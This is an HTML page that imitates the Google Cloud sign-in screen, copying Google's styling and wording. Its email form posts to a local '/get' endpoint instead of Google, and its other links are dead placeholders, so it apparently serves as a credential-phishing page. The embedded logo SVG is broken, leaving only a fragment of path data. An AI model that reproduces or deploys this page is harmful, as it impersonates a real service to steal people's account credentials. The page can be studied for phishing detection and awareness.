<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Google Cloud</title>
    <style>
      body {
        font-family: 'Google Sans', 'Product Sans', 'Roboto', Arial, sans-serif;
        background-color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 450px;
        padding: 48px 40px 36px;
        border: 1px solid #dadce0;
        border-radius: 28px;
        text-align: left;
      }
      #logo {
        margin-bottom: 8px;
      }
      .g-h1 {
        font-size: 24px;
        font-weight: 400;
        color: #1f1f1f;
        margin-bottom: 4px;
      }
      .g-h2 {
        font-size: 16px;
        color: #1f1f1f;
        margin-bottom: 32px;
        font-weight: 400;
      }
      .g-input {
        width: 100%;
        padding: 13px 15px;
        border: 1px solid #747775;
        border-radius: 4px;
        font-size: 16px;
        margin-bottom: 24px;
        box-sizing: border-box;
        outline: none;
        background: #fff;
      }
      .g-input:focus {
        border-color: #1a73e8;
        border-width: 2px;
        padding: 12px 14px;
      }
      .forgot {
        display: inline-block;
        margin-bottom: 24px;
        color: #1a73e8;
        font-size: 14px;
        text-decoration: none;
        font-weight: 500;
      }
      .forgot:hover {
        text-decoration: underline;
      }
      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 8px;
      }
      .create-account {
        font-size: 14px;
        color: #1a73e8;
        text-decoration: none;
        font-weight: 500;
      }
      .create-account:hover {
        text-decoration: underline;
      }
      .gbtn-primary {
        min-width: 64px;
        border: none;
        height: 36px;
        border-radius: 20px;
        font-family: 'Google Sans', Roboto, Arial, sans-serif;
        font-size: 14px;
        font-weight: 500;
        padding: 0 24px;
        background-color: #1a73e8;
        color: #fff;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background-color: #1765cc;
      }
      .footer {
        margin-top: 32px;
        font-size: 12px;
        color: #5f6368;
        line-height: 1.6;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 75 24" width="75" height="24">

-1.375-1.877c-.197-.74-.296-1.548-.296-2.425 0-.85.1-1.647.3-2.393a4.1 4.1 0 011.42-1.85c.607-.446 1.326-.67 2.157-.67.87 0 1.585.233 2.143.7.558.467.942 1.102 1.15 1.904h-2.518z"/>
      </svg>
      <h1 class="g-h1">Sign in to Google Cloud</h1>
      <h2 class="g-h2">Use your Google Account</h2>
      <form action="/get" method="POST">
        <input class="g-input" type="email" name="email" placeholder="Email or phone" required>
        <a href="#" class="forgot">Forgot email?</a>
        <button type="submit" class="gbtn-primary" style="float:right">Next</button>
      </form>
      <div style="clear:both"></div>
      <p class="footer">Not your computer? Use Guest mode to sign in privately. <a href="#" style="color:#1a73e8;text-decoration:none">Learn more about using Guest mode</a></p>
      <div style="margin-top:24px;display:flex;justify-content:space-between;align-items:center">
        <a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Create account</a>
        <span style="color:#5f6368;font-size:12px">English (United States)</span>
      </div>
    </div>
  </body>
</html>
